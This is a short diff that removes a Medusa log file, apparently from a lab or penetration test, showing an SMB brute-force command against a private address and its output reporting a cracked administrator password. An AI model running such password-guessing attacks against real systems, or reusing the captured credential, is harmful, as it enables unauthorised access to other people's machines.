@@ -1,4 +1,0 @@
-# Medusa v.2.2 (2019-03-24 14:40:31)
-# medusa -u administrator -P passwordList.txt -h 172.16.115.167 -M smbnt -O smb_brute.txt 
-ACCOUNT FOUND: [smbnt] Host: 172.16.115.167 User: administrator Password: Aa123456 [SUCCESS (ADMIN$ - Access Allowed)]
-# Medusa has finished (2019-03-24 14:40:32).
